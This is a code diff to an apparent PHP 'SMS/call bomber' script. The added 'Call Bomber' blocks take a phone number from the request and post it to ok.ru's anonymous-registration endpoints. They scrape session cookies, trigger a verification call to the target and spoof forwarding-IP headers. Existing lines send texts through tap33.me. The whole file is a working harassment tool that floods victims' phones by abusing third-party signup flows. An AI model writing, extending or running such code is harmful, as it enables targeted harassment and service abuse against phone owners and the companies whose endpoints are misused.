@@ -12,6 +12,8 @@ $Phone = htmlspecialchars($_GET['phone']);
 $count = htmlspecialchars($_GET['count']);
 $count_final = $count +1;
 $full_phone = "0$Phone";
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$ip = $_SERVER['REMOTE_ADDR'];
 //============================================================================//
 //Check Error!
 if(empty($Phone)){
@@ -62,6 +64,54 @@ $email = "$email_rand@gmail.com";
 $AccountOAuthTempID = random("23", "1");
 $guid = "".random("8", "3")."-".random("4", "3")."-".random("4", "3")."-".random("4", "3")."-".random("12", "3")."";
 //----------------------------------------------------------------------------//
+//Call Bomber Curl 1
+$url = "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhonea";
+$data = 'st.r.phone=%2B98'.$full_phone;
+$headers = [
+    "Host: ok.ru",
+    "Content-Type: application/x-www-form-urlencoded",
+    "User-Agent: ".$user_agent,
+    "CLIENT_IP: ".$ip,
+    "X_FORWARDED_FOR: ".$ip
+];
+$curl = curl_init();
+curl_setopt_array($curl, [
+    CURLOPT_URL => $url, 
+    CURLOPT_POST => true, 
+    CURLOPT_POSTFIELDS => $data, 
+    CURLOPT_HEADER => true, 
+    CURLOPT_HTTPHEADER => $headers, 
+    CURLOPT_RETURNTRANSFER => true
+]);
+$result = curl_exec($curl);
+curl_close($curl);
+$data = explode("\n" ,$result);
+$cookie = str_replace('set-cookie: ' ,'' ,$data[4]).';'.str_replace('set-cookie: ' ,'' ,$data[5]).';'.str_replace('set-cookie: ' ,'' ,$data[8]);
+$cookie = explode(';' ,$cookie);
+$cookie = $cookie[0].'; '.$cookie[6].'; '.$cookie[12].';';
+        
+//Call Bomber Curl 2
+$url1 = "https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI";
+$data1 = 'st.r.fieldAcceptCallUIButton=Call';
+$headers1 = [
+    "Host: ok.ru",
+    "Content-Type: application/x-www-form-urlencoded",
+    "User-Agent: ".$user_agent,
+    "CLIENT_IP: ".$ip,
+    "X_FORWARDED_FOR: ".$ip,
+    "Cookie: $cookie"
+];
+$curl1 = curl_init();
+curl_setopt_array($curl1, [
+    CURLOPT_URL => $url1, 
+    CURLOPT_POST => true, 
+    CURLOPT_POSTFIELDS => $data1, 
+    CURLOPT_HEADER => true, 
+    CURLOPT_HTTPHEADER => $headers1, 
+    CURLOPT_RETURNTRANSFER => true
+]);
+$result1 = curl_exec($curl1);
+curl_close($curl1);
 //Sms Sender Curl 1
 $Sender = curl_init();
 $Sender_Url = "https://tap33.me/api/v2/user";
